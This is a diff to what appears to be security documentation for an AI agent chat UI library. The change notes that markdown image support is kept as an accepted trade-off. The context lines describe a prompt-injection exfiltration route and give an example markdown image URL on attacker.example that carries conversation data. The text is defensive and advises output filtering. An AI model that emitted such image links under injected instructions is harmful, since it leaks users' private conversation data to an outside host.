@@ -57,7 +57,8 @@ The agent's output is untrusted text.
   `![](https://attacker.example/?q=<conversation data>)`, and the browser would request
   that URL. If your agent reads untrusted content and handles sensitive data, keep it from
   emitting such images (instructions, output filtering), or render messages with your own
-  component instead of `message_list`.
+  component instead of `message_list`. This is an accepted trade-off: markdown images stay
+  supported because many agents use them legitimately.
 
 ## Dangerous tools
 
